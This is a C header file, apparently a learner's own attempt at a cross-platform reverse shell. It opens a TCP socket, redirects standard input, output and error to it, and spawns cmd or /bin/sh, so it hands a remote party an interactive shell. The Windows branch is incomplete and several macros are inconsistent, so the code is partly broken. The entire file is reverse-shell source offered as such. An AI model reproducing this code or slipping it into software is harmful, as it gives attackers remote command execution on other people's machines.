#ifndef NETWORK_H
#define NETWORK_H

// This is my attempt to create reverse shell in Windows rather than 
// coping other code. 

#if !defined (_WIN32)
#define SOCKET int
#endif

#if defined (_WIN32)
#ifndef _WIN32_WINT
#define _WIN32_WINT 0x600
#endif
#include <Ws2tcpip.h>
#include <WinSock2.h>
#include <Windows.h>
#include <iphlpapi.h>
#pragma comment (lib,"ws2_32.lib")

#else

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>

#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define PORT 2333

SOCKET createSocket(){

    /*  For working with windows socket we must defined this
        TODO: refactor for portablity using function that can port to diff
        platform
    */
    #if defined (_WIN32)
        WSADATA d;
        // Error handling
        if(WSAStartup(MAKEWORD(2,2),&d)){
            return 1;
        }
        SOCKET sockfd = WSASocketA(2,1,6,NULL,0,0);
        return sockfd;
    #else

    SOCKET sockfd;

    struct sockaddr_in serverAddress;
    sockfd = socket(AF_INET,SOCK_STREAM,0);
    if(sockfd < 0){
        exit(1);
    }
    
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    serverAddress.sin_addr.s_addr = INADDR_ANY;
    
    if(connect(sockfd, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) <0 ){
        exit(1);
    }
    return sockfd;
    #endif
}


void *createReverseShell(void *p){
    printf("[*] Active Rerverse Shell");
    #if defined (_WIN32)
        SOCKET sockt = createSocket();
        STARTUPINFO si;
        memset(&si,0,sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES);

        si.hStdInput = (HANDLE)sockt;
        si.hStdOutput = (HANDLE)sockt;
        si.hStdError = (HANDLE)sockt;
        PROCESS_INFORMATION pi;
        CreateProcessA(NULL, "cmd",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
    #endif
    
    
    // input stream
    #if defined (WIN32)
    _dup2(sockt,0);
    _dup2(sockt,1);
    _dup2(sockt,2);
    #else
    int sockt = createSocket();
    dup2(sockt, 0);
    // output stream
    dup2(sockt, 1);
    // error stream
    dup2(sockt, 2);
    #endif
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

}
#endif